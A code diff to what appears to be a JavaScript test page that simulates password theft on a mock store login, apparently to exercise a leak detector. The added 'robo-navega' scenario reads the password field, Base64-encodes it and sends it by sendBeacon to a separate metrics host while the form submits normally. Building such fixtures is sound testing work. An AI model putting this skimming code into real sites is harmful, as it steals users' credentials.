@@ -6,6 +6,8 @@
     robo: "Un script de terceros envía la contraseña en Base64 al dominio de métricas.",
     "robo-blob": "El script envía la contraseña dentro de un Blob, que Chrome no deja inspeccionar.",
     url: "El script envía la contraseña en la URL de una petición a la propia tienda.",
+    "robo-navega":
+      "Como un sitio real: el script roba la contraseña y la tienda redirige a otra página tras iniciar sesión.",
   };
   const params = new URLSearchParams(location.search);
   const escenario = params.get("escenario") in ESCENARIOS ? params.get("escenario") : "limpio";
@@ -15,6 +17,15 @@
   document.getElementById("descripcion").textContent = ESCENARIOS[escenario];
 
   const form = document.getElementById("login");
+  if (escenario === "robo-navega") {
+    // El formulario se envía de verdad y la tienda responde con una redirección, como un sitio real.
+    form.action = "/login";
+    form.addEventListener("submit", () => {
+      const clave = form.querySelector('input[type="password"]').value;
+      navigator.sendBeacon(`${METRICAS}/recibir/beacon`, "c=" + btoa(clave));
+    });
+    return;
+  }
   form.addEventListener("submit", (event) => {
     event.preventDefault();
     const clave = form.querySelector('input[type="password"]').value;
